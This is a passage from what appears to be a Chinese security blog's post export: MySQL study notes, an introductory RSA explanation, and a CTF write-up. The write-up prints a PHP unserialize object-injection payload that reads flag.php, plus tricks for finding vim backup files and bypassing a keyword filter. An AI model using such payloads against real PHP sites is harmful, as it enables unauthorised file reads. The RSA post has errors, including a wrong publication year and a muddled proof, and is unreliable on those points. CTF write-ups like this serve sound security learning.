Language),比如授予和收回权限 grant 和 revoke(4)MySQL增加的语言元素，比如变量常量等。 部分常量值 十六进制常量 十六进制常量通常被当做字符串来存储，在字符串前面加一个x或者X，注意数字不能超出16进制的范围，如果在前面几加0x的话就不需要加引号了，十六进制默认作为字符串来处理，如果想作为数字处理的话，使用 CAST(… AS UNSIGNED) 语句，比如 select 0x41,cast(0x41 as unsigned);, HEX()函数可将字符串转换为十六进制。 位字段值 一般使用b’value’来表示二进制值。 BIN()可以把位字段常量转为二进制显示， OCT()转为数字显示。 变量 用户变量 语法格式 1set @user_variables1&#x3D;expression1[,user_variables2&#x3D;expression2...] 系统变量 分为全局变量(GLOBAL)和局部变量(LOCAL &#124; SESSION) 常用函数 1、数学函数(数学函数支持嵌套使用) 1、great() 和 least()函数： 获取一组数中的最大值和最小值 1great(1,2,3)--&gt;3 least(1,2,3)--&gt;1 注意：MySQL中函数名与括号之间不能有空格 2、 floor() 和 ceiling() 函数 floor() 函数用于获得小于一个整数的最大整数值，ceiling 用于获得大于一个整数的最小整数值。 3、 round() 和 truncate() round() 用于获得一个数的四舍五入的整数值。 truncate(a,b) 用于把一个数字a截取为一个指定小数位数b的数字 1truncate(1.54578,2)--&gt;1.54 4、 abs() 函数 获取绝对值 5、 sign() 函数 返回数字的符号，返回的结果是正数(1)，负数(-1)、或者零(0) 6、 sqrt() 函数 返回平方根 7、 pow() 函数 pow(a,b)—&gt; a^b 8、 bin() 、 otc() 、 hex() 函数 分别返回一个数的二进制、八进制和十六进制值，作为字符串返回 2、聚合函数 比如 count(), sum() 等 3、字符串函数 1、 ascii(char) 函数 返回字符表达式最左端字符的ASCII值，返回值为整型 2、 char() 函数 1char(x1,x2,x3,...) 将x1,x2,x3的ascii码转换为字符，组成一个字符串。 3、 left() 和 right 函数 left&#124;right (str,x) 返回字符串str左边或右边的前x个字符 4、 trim 和 ltrim 和 rtrim 函数 1trim|ltrim|rtrim(str) ltrim 和 rtrim 分别删除字符串左边和右边的空格，trim 则删除左右两边的空格。 5、 rpad() 和 lpad 函数 1rpad|lpad(str,n,pad) 用字符串pad对字符串str左边后右边进行填充，直到str的字符数目得到n个，若str的字符个数大于n，则返回前n个字符 6、 replace(str1,str2,str3) 函数 用字符串str3替换str1中所有出现的字符串str2。 7、 concat(s1,s2,s3,…) 字符串连接函数 8、 substring(expr,start,length) 返回指定长度的子串 9、 strcmp(s1,s2) 字符串比较函数 4、 类型转换函数 1cast(expr,AS type) expr是要转化的值，type是转换后的数据类型，类型有binary , char , date , date , time , datetime , signed , unsigned 。 5、 控制流函数 1、 ifnull() 和 nullif() 函数 1ifnull(expr1,expr2) 判断参数expr1是否为null，如果expr1为null，则返回expr2，否则返回expr1。 1nullif(expr1,expr2) 判断两个参数是否相等，如果相等返回null，否则返回第一个参数。 2、 if() 函数 1if(expr1,expr2,expr3) 函数会判断expr1是否为真，如果表达式为真则返回第二个参数，如果为假返回第三个参数。","categories":[{"name":"资料","slug":"资料","permalink":"http://chaosec.top/categories/%E8%B5%84%E6%96%99/"}],"tags":[{"name":"SQL","slug":"SQL","permalink":"http://chaosec.top/tags/SQL/"}]},{"title":"MySQL学习笔记(四)","slug":"MySql4","date":"2018-02-03T03:21:58.000Z","updated":"2018-02-04T06:51:31.365Z","comments":true,"path":"2018/02/03/MySql4/","link":"","permalink":"http://chaosec.top/2018/02/03/MySql4/","excerpt":"前言 本次学习内容为MySQL索引与完整性约束，MySQL索引类似于书本的目录，是为了方便地找到要查找的数据。而完整性约束是指对数据的输入合法性等进行完整性约束检查。","text":"前言 本次学习内容为MySQL索引与完整性约束，MySQL索引类似于书本的目录，是为了方便地找到要查找的数据。而完整性约束是指对数据的输入合法性等进行完整性约束检查。 MySQL索引 索引及其作用 MySQL索引的存储方式是另外存储一个文件来保存索引值，查找时通过索引定位到行的位置从而快速的查找数据。MySQL索引可以由最多15个列组成，最大索引长度 是256字节。 索引的分类 由于索引是保存在文件中的，所以是要占据磁盘空间的，MySQL中一个表的索引都保存在一个索引文件夹中，如果增加删除或者更新表的一行，那么MySQL也会自动的更新索引，保证索引和表中的内容保持一致。 1、 BTREE索引 普通索引(INDEX) 这是最基本的索引，没有唯一性约束， 唯一性索引(UNIQUE) 唯一性索引，即每一列的索引值都只能出现一次，必须是唯一的。 主键(PRIMARY KEY) 主键索引，拥有唯一性索引的特点，但是一个表只能有一个主键。既可以在创建的时候指定，也可以通过修改表的方式加入主键。 全文索引(FULLTEXT) 全文索引只能在 VARCHAR 或者 TEXT 类型中使用，并且只能在MyISAM中创建。对于大规模数据集来说，通过 alter table或者 create index命令创建会更快一些。 2、 哈希索引(HASH) 当表类型为MEMORY或者HEAP时，MySQL还支持HASH索引，当根据一个值获取特定行时，哈希索引非常快。 MySQL索引创建 create index 123456create [unique | fulltext | spatial] index 索引名 [索引类型] on 表名 (索引列名,) [索引选项] ...索引列名=: 列名 [(长度)] [asc | desc] 说明 spatial为空间索引索引类型包括BTREE和HASHcreate index不能创建 主键索引列名，创建索引列名后的长度表示该列前面创建索引字符个数，这可以节省磁盘空间。 举例 根据sx表的学号列上的前5个字符建立一个升序索引xh_xs 12create index xh_xs on xs(学号(5) asc); alter table创建 略 建表时创建索引 略 删除索引 1drop index 索引名 on 表名 或者 12345alter [ignore] table 表名...|drop primary key # 删除主键|drop &#123;index|key&#125; 索引名 # 删除索引|drop foreign key fk_symbo # 删除外键 CHECK完整性约束 语法格式 1check(expr) 举例 1234567create table student( 学号 char(6) not null, 性别 char(1) not null check(性别 in ('男','女')))；","categories":[{"name":"资料","slug":"资料","permalink":"http://chaosec.top/categories/%E8%B5%84%E6%96%99/"}],"tags":[{"name":"SQL","slug":"SQL","permalink":"http://chaosec.top/tags/SQL/"}]},{"title":"RSA算法初探","slug":"RSA初探","date":"2018-01-29T07:07:54.000Z","updated":"2018-01-29T07:42:06.323Z","comments":true,"path":"2018/01/29/RSA初探/","link":"","permalink":"http://chaosec.top/2018/01/29/RSA%E5%88%9D%E6%8E%A2/","excerpt":"前言 不得不承认我的数学真的是灰常灰常渣，研究了好久才差不多弄明白，真的感觉又被数学虐了o(╥﹏╥)o，不过打比赛需要掌握，咬着牙也得弄明白呀。","text":"前言 不得不承认我的数学真的是灰常灰常渣，研究了好久才差不多弄明白，真的感觉又被数学虐了o(╥﹏╥)o，不过打比赛需要掌握，咬着牙也得弄明白呀。 正文 我看许多的介绍文章都是先讲一大堆的数学公式然后再开始介绍RSA，给我一顿绕啊，愣是不知道在干什么，所以我想先介绍RSA，过程中需要什么数学理论再用什么理论，这样对于数学渣渣会友好一些。 RSA介绍 RSA公钥加密算法是1977年由罗纳德·李维斯特（Ron Rivest）、阿迪·萨莫尔（Adi Shamir）和伦纳德·阿德曼（Leonard Adleman）一起提出的。1987年7月首次在美国公布，当时他们三人都在麻省理工学院工作实习。RSA就是他们三人姓氏开头字母拼在一起组成的。RSA是目前最有影响力和最常用的公钥加密算法，它能够抵抗到目前为止已知的绝大多数密码攻击，已被ISO推荐为公钥数据加密标准，是一种非对称加密算法。今天只有短的RSA钥匙才可能被强力方式解破。到2008年为止，世界上还没有任何可靠的攻击RSA算法的方式。只要其钥匙的长度足够长，用RSA加密的信息实际上是不能被解破的。但在分布式计算和量子计算机理论日趋成熟的今天，RSA加密安全性受到了挑战和质疑。RSA算法基于一个十分简单的数论事实：将两个大质数相乘十分容易，但是想要对其乘积进行因式分解却极其困难，因此可以将乘积公开作为加密密钥。一句话，RSA是目前最重要的网络加密算法。 RSA密钥生成 第一步 选定两个质数p、q，实际应用中这两个数越大安全性越高。 第二步 计算p、q的乘积，即n = p&#42;q，n的二进制表示时所占的二进制位数就是密钥长度，实际应用中密钥长度一般为1024位，对于更高保密级别的应用则为2048位。 第三步 计算n的 欧拉函数 φ(n) = (p-1)&#42;(q-1)，为了保持连贯性，欧拉函数先按下不表 第四步 随机选定一个数e1，要求1 &lt; e1 &lt; φ(n)，并且要求e1与n互质（实际应用中这个数字常选择65537），不知道什么是互质请点击这里 第五步 寻找一个e2，要求 e1 &#42; e2 ≡ 1 （mod φ(n)），好像是可以用扩展欧几里得算法 算出来，但是恕本人实在对数学不感冒，这个就略过了，想学的自己百度吧。 第六步 封装（n，e1）为公钥 ，（n，e2）为私钥。 至此，所有准备工作完成。 加密和解密 先介绍一下加解密的公式，假定明文为A，那么， 密文B≡A^e1 mod n，要传输给对方的就是B 对方得到B之后利用私钥进行恢复，公式A≡B^e2 mod n，从而得到明文A。 假定我选择了p = 5，q = 7，那么相应的n = 35，φ（n） = 24，再假定我选择了e1 = 5，那么e2 = 29（别问我怎么算出来的，我是不会告诉你我是编代码试出来的！！），那么我的公钥就是（5，35），私钥就是（29，35）。那么接下来就开始我们的秘密通信(^▽^)。 假定要传输的明文为： 32 注意：传输的内容必须为整数，并且要小于n，如果要传送字符串，可以用ascii码或unicode 编码传输。 加密 A = 32，则B=A^e1 mod n = 2，将密文B发送，这个过程使用公钥进行加密 解密 A = B^e2 mod n = 32 ，成功得到明文32！ RSA破解 所谓兵来将挡水来土掩，有人搞出来加密算法，就有人想搞出来破解算法，那么想要破解RSA能做到吗？我们不妨来看一下我们在整个过程中都用到了那些数据 p、q、n、φ（n），e1，e2 公钥用到了n，e1，只要我们能找到e2，就攻破了RSA。那么有没有可能通过这两个数找到e2呢？先看看e2是怎么来的 e1 * e2 mod φ（n） = 1 根据公式可以知道我们得到φ（n）就可以得到e2，那么φ（n）又是怎么来的呢？ φ（n）= （p-1）&#42;（q-1） 我们又需要得到p、q，再来 n = p * q 总算到了（开森）！我们只需要分解n就行了！！唉，不得不说，千里之堤毁于蚁穴，大名鼎鼎的RSA居然栽在了这么简单的问题上，哈哈哈！！ 但是~~，如果你真的觉得你就此就破解了RSA，那你真是Too Young Too Simple，分解我的n=35，洒洒水的难度，那么，请你给我分解一下下面这个数字怎么样、 152564564212344523123146785123123456484887123121231234567874645645132165867845456456456545645645123123123156445564523121322312312345645456456565656565 有办法吗？事实上，分解这些大数的因子是非常非常困难的，以目前的计算能力，分解1024位的大数需要两年，分解2048位的大数需要80年，远超数据本身的价值，这就是RSA算法牢不可破的真实原因，就是建立在大数分解困难的基础上的，所以今后如果计算能力提高，或者找到其它简单算法来分解大数，那么RSA算法安全性就消失了。 理论解释 是不是觉得刚刚的东西很神奇？！！，对，就是这么神奇，这背后都是伟大的数学家的功劳，虽然我不喜欢数学，但还是很佩服他们可以搞出这么骚的东西。废话不多说，来慢慢解释一下，鉴于我的数学水平… 数学解释只解释了所应用的数学原理，不再对数学原理进行证明，如果感兴趣的话可以自己证明之。 大名鼎鼎的 欧拉定理 若n,a为正整数，且n,a互质，则$a^{φ(n)} ≡ 1 （mod \\; n）$ φ（n）为 欧拉函数 ,欧拉函数是小于n的正整数中与n互质的数的个数，下面介绍一个性质 如果n可以分解为两个互质的整数p、q的乘积，那么有φ（n）= (p-1) * (q-1) 接下来要证明的就是为什么下面两个式子可以互换实现 B=A^e1 mod nA=B^e2 mod n 解密规则为 A=B^e2 mod n 根据加密规则 B = A^e1 mod nB = A^e1 - kn 代入解密式中 (A^e1 - kn)^e2 ≡ A （mod n） 等于证 $A^{e1&#42;e2} ≡ m （mod \\; n）$，（对于这一步我并不知道为什么） 由 欧拉定理 可以得到 e1&#42;e2 ≡ 1 [ mod φ（n）]e1&#42;e2 ≡ hφ（n）+1 代入前面的式子可以得到 $A^{hφ（n）+1} \\;= m (mod\\;n)$ 接下来证明上述恒等式 分两种情况 1、A和n互质 由欧拉定理 $A^{φ（n）}≡1（mod\\;n）$ 代入前式可以得到 ${(A^{φ（n）})}^{h}&#42;A \\;= m (mod\\;n)$ 原式得证 2、A和n不互质 自己开发吧老铁，我不想写了。而且我也不怎么会。 RSA其实并不难，想要掌握它并不需要很高的数学基础，认真学一学还是可以学的明白的，废话不多说，赶紧练习一波去也！","categories":[{"name":"资料","slug":"资料","permalink":"http://chaosec.top/categories/%E8%B5%84%E6%96%99/"}],"tags":[{"name":"RSA","slug":"RSA","permalink":"http://chaosec.top/tags/RSA/"}]},{"title":"CUMT-CTF2017冬","slug":"cumtctf2017","date":"2018-01-27T07:46:56.000Z","updated":"2018-03-12T13:33:25.034Z","comments":true,"path":"2018/01/27/cumtctf2017/","link":"","permalink":"http://chaosec.top/2018/01/27/cumtctf2017/","excerpt":"第一次打ctf，感觉自己确实是个渣渣，不过万事开头难，有第一次总是好的，这次也让我意识到了自己的不足，自己要学的东西还是很多很多的。","text":"第一次打ctf，感觉自己确实是个渣渣，不过万事开头难，有第一次总是好的，这次也让我意识到了自己的不足，自己要学的东西还是很多很多的。 0x1 what？？ 一个代码审计问题,与反序列化有关 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647&lt;?php @error_reporting(1); class sky &#123; protected $skyobj; function __construct() &#123; $this-&gt;skyobj = new sec; &#125; function __toString() &#123; if (isset($this-&gt;skyobj)) return $this-&gt;skyobj-&gt;read(); &#125; &#125; class nosec &#123; public $filename; function read() &#123; $file = \"./&#123;$this-&gt;filename&#125;\"; if (file_get_contents($file)) &#123; return file_get_contents($file); &#125; else &#123; return \"you must be joking!\"; &#125; &#125; &#125; class sec &#123; function read() &#123; return \"it's so sec~~\"; &#125; &#125; if (isset($_GET['data'])) &#123; $Input_data = unserialize($_GET['data']); echo $Input_data; &#125;?&gt; PHP序列化的目的旨在实现不同的PHP文件之间的对象传递，在序列化对象创建之前，如果类中定义了&#95;&#95;sleep()函数，则会调用该函数，而在序列化对象创建时则会调用&#95;&#95;wakeup()函数（如果定义了的话），当然，还有PHP许多其他的魔法方法。分析一下，该例中关键应该在read函数上，但是必须要调用到nosec才可以实现，该例中sky类中默认创建sec类，显示是不行的，必须要创建出nosec才可以用。 payload 1234567891011121314151617181920212223&lt;?php @error_reporting(1); class sky &#123; protected $skyobj; function __construct() &#123; $this-&gt;skyobj = new nosec;//在此处更改对象，实现对象的绕过 &#125; function __toString() &#123; if (isset($this-&gt;skyobj)) return $this-&gt;skyobj-&gt;read(); &#125; &#125; class nosec &#123; public $filename='flag.php'; &#125;$obj = new sky();echo urlencode(serialize($obj)) //千万记住url编码，真的太多坑！！！！?&gt; O%3A3%3A%22sky%22%3A1%3A%7Bs%3A9%3A%22%00%2A%00skyobj%22%3BO%3A5%3A%22nosec%22%3A1%3A%7Bs%3A8%3A%22filename%22%3Bs%3A8%3A%22flag.php%22%3B%7D%7D 直接提交上去即可获得编码。注意：以后一定要多检查元素，当时好像已经做出来了 ，可惜这个flag居然藏在控制台里面。同理，还可以利用该函数的特性去实现写文件等等操作。 0x2 代码混淆 有个小知识点，vim会自动产生备份文件，比如文件名为submit.php，则产生的文件可能为.submit.swp，submit.php~，submit.php.bak多试试。然后就开始解混淆代码。 解混淆代码的时候，应该先把变量名提取出来，可以通过下面的代码dump变量出来 1234&lt;?phpinclude \"index.php\";var_dump(get_defined_vars());?&gt; 恢复出来的关键代码如下 1234567891011121314$IIIIIIIIIIll = @$_GET['img_tet'];$IIIIIIIIIIll = htmlspecialchars($IIIIIIIIIIll);$IIIIIIIIIIll = str_replace('flag',\"\",$IIIIIIIIIIll);if ($IIIIIIIIIIll!=\"\")&#123; header('Content-Type: imgage/jpeg'); header('Content-Disposition: attachment; filename='.$IIIIIIIIIIll); header('Content-Lengh: '.filesize($IIIIIIIIIIll)); $IIIIIIIIII11 = fopen($IIIIIIIIIIll,\"r\") or die(\"Unable to open file!\"); $IIIIIIIIIlIl = fread($IIIIIIIIII11,filesize($IIIIIIIIIIll)); fclose($IIIIIIIIII11); echo $IIIIIIIIIlIl;&#125; 题目过滤flag，所以可以用flflagag绕过，即可得到flag，这个题其实也不难，只是毕竟是我第一次，需要纪念一下。","categories":[{"name":"writeup","slug":"writeup","permalink":"http://chaosec.top/categories/writeup/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"http://chaosec.top/tags/CTF/"}]},{"title":"MySQL学习笔记(三)","slug":"mysql3","date":"2018-01-18T05:13:19.000Z","updated":"2018-07-31T01:40:59.947Z","comments":true,"path":"2018/01/18/mysql3/","link":"","permalink":"http://chaosec.top/2018/01/18/mysql3/","excerpt":"Mysql操作表,例如SELECT语句等。","text":"Mysql操作表,例如SELECT语句等。 SELECT语句 1234567891011121314151617select [all|distinct|distinctrow] # 指定是否重复行应被返回，如不指定默认值为all [high_priority] # 优先级设置 [straight_join] # 促使mysql把表联合在一起,加快查询速度 [sql_small_result] [sql_big_result] [sql_buffer_result] # 设置结果集的显示 [sql_cache|sql_no_cache] [sql_calc_found_rows] # cache指定是否要把结果集存储在查询表缓存中，第三个选项指定结果集的行数，忽略limit 列名表达式 ... [from 表或视图 ... [...]] [where 条件] [group by &#123;列名|表达式|position&#125; [asc|desc],... [with rollup]] [having 条件] [order by &#123;列名|表达式|position&#125; [asc|desc],...] [limit &#123;[offset,] row_count|row_count OFFSET offset&#125;] [procedure 存储过程名(参数...)] [into outfile &#39;文件名&#39; [character set 字符集] # 将表中的行导出到文件中 export_options|into dumpfile &#39;文件名&#39;|info 变量名 ...] [for update|lock in share mode]] # 对结果集加锁，for update更推荐 选择列 as 指定列别名 1select 学号 as number from stu; # 指定结果集别名 替换查询结果中的数据12345678910111213case when 条件1 then 表达式1 when 条件2 then 表达式2 ... else 表达式nendEXP: select 编号,姓名 case when 编号 is null then &#39;ff&#39; else &#39;ok&#39; end from stuinfo;计算列值123select 表达式 ... # 可以进行加减乘除取余%等运算exp：select 学号,成绩*1.2 from xs where ID&#x3D;1; 聚合函数(aggregation function) 聚合函数常用于对一组值进行计算，返回单个值，通常与group by子句一起使用,作用于列 函数名 说明 语法 备注 count 求组中系数，返回int类型数据 count({[all&#124;distinct] 表达式}&#124;*) &#42;将返回检索行总数目，包括其值包含null max 求最大值 max([all&#124;distinct] 表达式) 数据类型可以是数字、字符和时间日期类型 min 求最小值 略 sum 返回表中所有值的和 sum/avg([all&#124;distinct] 表达式) avg 组中平均值 std/stddev 返回标准差 variance 方差 group_concat 返回由属于一组的列值连接组合而成的结果 用法略 该函数返回指定列的所有非NULL值，中间用逗号隔开，长度最大限制1024 bit_and 逻辑或 bit_or 逻辑与 bit_xor 逻辑异或 FROM子句 1234from table_reference ... table_reference:表名 [[as] 表名别名] [&#123;use|ignore|force&#125; index (key_list)] &#x2F;*查询表，use指使用索引，ignore指忽略索引*&#x2F;|join_table &#x2F;*连接表*&#x2F; 多表连接1)全连接，实质是表的等值连接这种连接会产生所有可能的组合，也就是每个表的行数之积“select 编号,ID from stuinfo,student;”这样会返回两个表行数之积,通常需要用where语句限制结果行数2)JOIN连接123456join_table: table_reference [inner|cross] join table_factor [join_condition] |table_reference straight_join table_factor |table_reference straight_join table_factor on conditional_expr |table_reference &#123;LEFT|RIGHT&#125; [outer] join table_reference join_condition |table_reference natural [&#123;LEFT|RIGHT&#125; [outer]] join_table_factortable_reference指定要连接的表名join_condition：12on 条件|using (列...)on条件主要用于连接表，其他不属于连接表的条件可以使用where子句来指定，inner指内连接，是系统默认的方式。exp:1select 编号,ID from stuinfo join student;join还可以将自身进行连接，称为自连接，但是要指定不同的别名 WHERE子句 where子句必须紧跟在from子句之后，用于确定选取行 1where 条件 其中条件为查询语句12345条件&#x3D;: &lt;precdicate&gt; |&lt;precdicate&gt;&#123;and|or&#125;&lt;precdicate&gt; |(条件) |not 条件precidicate为判定运算，结果又TRUE，FALSE或UNKNOWN123456789&lt;precdicate&gt;: 表达式 &#123;&#x3D;|&lt;|&lt;&#x3D;|&gt;&#x3D;|&lt;&#x3D;&gt;|&lt;&gt;|!&#x3D;&#125; 表达式 # &quot;&lt;&#x3D;&gt;&quot;相等或都等于空返回true，否则返回false，绝不会返回unknown |表达式 [not] like 表达式 [escape &#39;escape_character&#39;] |表达式 [not] [regexp|rlike] 表达式 |表达式 [not] between 表达式 and 表达式 |表达式 is [not] null |表达式[not] in (subquery |表达式[,...n]) |表达式 &#x3D;|&lt;|&lt;&#x3D;|&gt;&#x3D;|&lt;&#x3D;&gt;|&lt;&gt;|!&#x3D;&#125; &#123;all|some|any&#125; (subquery) |exist (子查询)模式匹配 1)like运算符 1表达式 [not] like 表达式 [escape &#39;escape_character&#39;] 模式匹配时，可用%和_进行模糊查询，%代表0个或多个字符,符号_代表单个字符escape 转义字符，例如当要匹配的字符串中有_或%时，此时应通过该字符前的转义字符指明其为模式串中的字符，使用escape可以指定转义字符 2)regexp(正则表达式)，是mysql的一个功能。 1match_exp [not][regexp|rlike] match_exp 特殊字符 含义 ^ 匹配字符串的开始部分 $ 匹配字符串结束部分 . 匹配任何一个字符 * 匹配*之前的0个或多个字符的任何序列 + 匹配+之前的1个或多个字符的任何序列 ? 匹配？之前的0个或多个字符 {n} 匹配括号前的内容出现n次的序列 () 匹配括号里的内容 [abc] 略 [a-z] 略 a-z 略 &#124; 匹配符号左边或右边出现的字符串 [[..]] 匹配方括号里出现的符号 [[:&lt;:]和[[:&gt;:]] 匹配一个单词的开始和结束 [[:] 匹配方括号里出现的字符串中的任意一个字符 范围比较(between或者in)12exp [not] between exp1 and exp2 # exp1必须小于exp2，表达式也可是字符串exp in (exps [,...n]) # 该关键字主要用于表达子查询空值比较1exp is [not] null子查询 指使用另一个查询的结果作为条件的一部分，即查询的嵌套 1)in子查询 1exp [not] in (subquery) in子查询只能返回一列数据，对于较复杂的查询可使用嵌套的子查询 2)比较子查询（使表达式的值与子查询的结果进行比较运算） 1表达式 &#123;&lt;|&lt;&#x3D;|&#x3D;|&gt;|&gt;&#x3D;|!&#x3D;|&lt;&gt;&#125; &#123;all|some|any&#125; (subquery) all指定表达式要与结果集的每个值都进行比较，全部满足时才返回true，否则返回false。some与any同义，找到满足的值就会返回true，否则返回false。 3)exists子查询 判断查询结果集是否为空表 1[not] exists (subquery) 以上各种子查询还可用在select的其他子句中，例如from语句，但是必须为子查询产生的一个中表定义一个别名 GROUP BY子句 根据字段进行分组，所要查找的内容不得多于分组数1group by &#123;列名|表达式|position&#125; [asc|desc],... [with rollup]rollup用于对group by子句指定的各列产生汇总行。 举例 1select name,username from student where job='信息安全' group by username; 上述语句执行时会报错，原因在于 group by 语句的执行过程为先执行group by子句，然后对gruop by 语句的汇总行再进行操作，本例中group by子句执行后只产生了一列(列名为username)，所以执行到查询name字段时会无法查询从而报错。但是这个时候可以使用聚合函数来查询其他字段的信息，因为聚合函数可以作用于所有列，当然也可以增加group by 子句的字段 用例解析 1select 专业,性别,count(编号) from stuinfo group by 专业,性别 with rollup; 返回结果 专业 性别 count(编号) 信息安全 女 1 信息安全 男 4 信息安全 NULL 5 土木工程 男 6 土木工程 NULL 6 计算机 女 3 计算机 男 6 计算机 NULL 9 NULL NULL 20 1select 专业,性别,count(编号) from stuinfo group by 性别,专业 with rollup; 返回结果 专业 性别 count(编号) 信息安全 女 1 计算机 女 3 NULL 女 4 信息安全 男 4 土木工程 男 6 计算机 男 6 NULL 男 16 NULL NULL 20 以上两个查询语句只是group by语句后面的顺序不同，该语句的组织方式是按列的排序的逆序进行汇总，例如第一例先对性别字段产生了汇总（针对专业相同的行），然后对专业名和性别名均不同的行产生了汇总行，如果列数是多列的话，也依然会这样依次汇总。 HAVING子句 HAVING子句用于在group by子句后选择行，和WHERE子句类似，where子句用于在from 子句后选择行，区别是 having子句可以作用于聚合函数，而where子句不可以。语法格式 1having 条件 举例 1select 专业,avg(年龄) from stuinfo where 年龄 &lt; 96 group by 专业 having avg(年龄); ORDER BY子句 如果不适用order by子句的话，结果集中的行的顺序将是不可预料的，使用该语句行可以对行的排序顺序方式进行指定，如果order by子句后面指定了多个条件，则会按照逆序方向依次排序。1order by &#123;列名|表达式|position&#125; [asc|desc], ... position 表示结果集中该位置的列排序，是一个正整数。 举例 1select * from stuinfo order by 年龄; # 根据年龄来排序 LIMIT子句 LIMIT子句用来限制 select 语句返回的行数。 语法格式 1LIMIT &#123;[offset,] row_count | row_count OFFSET offset&#125; 说明： offset 为对于结果集首行的偏移量（首行偏移量为0），如offset=3，则会从第四行开始返回数据。 举例 12select * from stuinfo where 专业='信息安全' limit 1,2;select * from stuinfo where 专业='信息安全' limit 2 offset 1; # 这两个语句是等价的 UNION语句 UNION 语句用来把多个 select 语句返回的结果组合到一个结果集中。 语法格式 123select ...union [ALL | DISTINCT] select ...[ union [ALL | DISTINCT] select ... ] 说明 select语句为常规的select语句，但是必须遵守以下规则 1、各个select语句对应位置的列应该具有相同的列名、类型和数目，2、只有最后一个select语句可以使用 into outfile3、order by 和 limit 只能在整个语句最后指定，并对整个最终结果起作用。4、使用union语句的时候，MySQL会自动剔除重复数据，所以distinct可以省去。 举例 1select * from stuinfo where 专业='信息安全' union select * from stuinfo where 专业='土木工程' order by 5 limit 6; HANDLER 语句 前面使用的 select 语句通常用来返回行的集合，MySQL中还有另外一个可以返回行的语句： handler 语句。它能够一行一行的浏览表中的数据，这不是SQL标准，而是MySQL 的一个扩展，只适用于MyISAM表和InnoDB表。使用该语句时要先打开一个表，然后在读这个表，使用完之后还必须关闭已经打开的表。 1、打开一个表 语法格式 1handler tablename open [ [ as ] 别名 ]; # as用于指定别名 2、 浏览表中的行 语法格式1 1handler tablename read &#123; first | next &#125; [where 条件] [limit ...]; 注意：此处的limit 字段用来控制返回的结果语句的行数，默认只有一行。 语法格式2 1234handler tablename read 索引名 &#123;&lt;|&gt;|=|...&#125; (值...) [where 条件] [limit ...]; # 以比较运算符为索引读取行handler tablename read 索引名 &#123;first | next | prev | last &#125; [where 条件] [limit ...]; # 以关键字来读取行 3、关闭打开的表 语法格式 1handler tablename close; 视图（view） 此处只对视图进行简单的介绍。视图是从一个或多个表（视图）中导出（通过查询方式）的表，是一个 虚表 ，即数据库中只存储视图的结构不存储具体数据，需要时再在表中进行查询使用。使用方便，安全性高。 语法格式 123456create[or replace] # 用replace能替代同名视图[definer = &#123;user|current_user&#125;]view 视图名 [(列名 ...)]AS select 语句[with [cascaded|local] check option] 执行查询、修改、删除等操作时与对表的操作类似。","categories":[{"name":"资料","slug":"资料","permalink":"http://chaosec.top/categories/%E8%B5%84%E6%96%99/"}],"tags":[{"name":"SQL","slug":"SQL","permalink":"http://chaosec.top/tags/SQL/"}]},{"title":"MySQL学习笔记(二)","slug":"mysql2","date":"2018-01-07T14:16:20.000Z","updated":"2018-07-31T01:52:39.508Z","comments":true,"path":"2018/01/07/mysql2/","link":"","permalink":"http://chaosec.top/2018/01/07/mysql2/","excerpt":"Mysql数据库的增删查改","text":"Mysql数据库的增删查改 MYSQL基本命令 命令 解释 备注 show variables like ‘char%’; 显示系统中带有char字符的系统参数 set character_set_client gbk; 设置客户端编码方式为GBK status; 显示当前系统信息 delimiter $$ 修改命令结束符号为$$ 想要恢复；作为结束符使用 opdelimiter ; 数据库语句 创建数据库 12create [database|schema] [if not existe] databasename[options ...]修改数据库12ALTER [DATABASE|SCHEMA] [DATABASENAME] OPTION ...此命令用于修改数据库的全局特性，这些特性存在db.opt文件中，如果语句中忽略数据库名，则会修改当前数据库示例代码12alter database xscjdefault charcter set gb2312; 删除数据库DROP DATABASE DATABASENAME 表结构操作语句 创建表 12345create [temporary] table [if not exists] user( id int auto_increment not null primary key, username varchar(10) not null); # 使用ifnot...从句可以不显示错误信息 # unique key也可以表示字段名唯一 插入语句 1insert into tablename values(1,&#39;Tom&#39;) # 字符串串值需要用引号括起来 复制现成的表 123CREATE TABLE TABLE_NAME LIKE HAVED_TABLE; # 该命令会复制一个与已有表结构相同的空表CREATE TABLE TABLE_NAME AS (表达式ex：select * from haved_table); # 该命令是复制表达内容，但是表达式和索引不会复制，只会复制内容部分，例如主键特性就不会被复制 修改表 修改表结构 123456789101112ALTER [IGNORE] TABLE table_name option ...OPTIOIN:ADD [COLUMN] 列定义 [FIRST|AFTER 列名] &#x2F;*添加列*&#x2F;ALTER [COLUMN] 列名 &#123;SET DEFAULT literal|DROP DEAFAULT&#125; &#x2F;*修改默认值*&#x2F;CHANGE [COLUMN] 列名 愿列名 [FIRST|AFTER 列名] &#x2F;*列名重定义*&#x2F;MODIFY [COLUMN] 列定义 [FIRST|AFTER 列名] &#x2F;*修改列数据类型*&#x2F;DROP [COLUMN] 列名 &#x2F;*删除列*&#x2F;RANAME [TO] 列表名 &#x2F;*重命名该表*&#x2F;ORDER BY 列名 &#x2F;*排序*&#x2F;CONVERT TO CHARACTER SET 字符集名 [COLLATE 校对规则名] &#x2F;*将字符集转换为二进制*&#x2F;[DEFAULT] CHARACTER SET 字符集名 [COLLATE 校对规则名] &#x2F;*修改默认字符集*&#x2F; 示例代码1231.alter table xs add column 性别 bit not null after 姓名; # 注意列名不加引号，加了会报错2.alter table xs change 备注 backup char(10); # 修改列名，先给出原列名，注意后面必须要加新列名的数据类型3.alter table xs modify backup char(11); # 修改列的数据类型，但是如果新的数据类型与所存的数据类型冲突则会错误对于多条命令可以用，号隔开123alter table xs add 年级 tinyint, drop column 姓名; 更改表名 1RENAME TABLE 老表名 TO 新表名 &#x2F;*多个命令之间用逗号隔开*&#x2F; 删除表 1DROP [TEMPORARY] TABLE [IF EXISTS] 表名 表结构特点 1.表达空值与数值数据0或者空字符混为一谈，任意两个空值都不相等2.长度小于4的varchar被改变为char3.隐含的改变列类型 表记录操作 插入记录 4.1 插入新纪录 12345INSERT [LOW_PRIORITY|DELAYED|HIGH_PRIORITY] &#123;%raw%&#125;[IGNORE]&#123;%endraw%&#125; # low,delayed等表示该操作的优先级 [INTO] 表名 [(列名,...)] VALUES(&#123;expr|default&#125;,...),(,...),... |SET 列名&#x3D;&#123;expr|default&#125;,... [ON DUPLICATE KEY UPDATE 列名&#x3D;expr,..] # 该语句作用是如果发生unique key或primary key或primary出现重复，则按照该语句指定的列插入 4.2 从已有表中插入新记录 1234INSERT [LOW_PRIORITY|DELAYED|HIGH_PRIORITY] 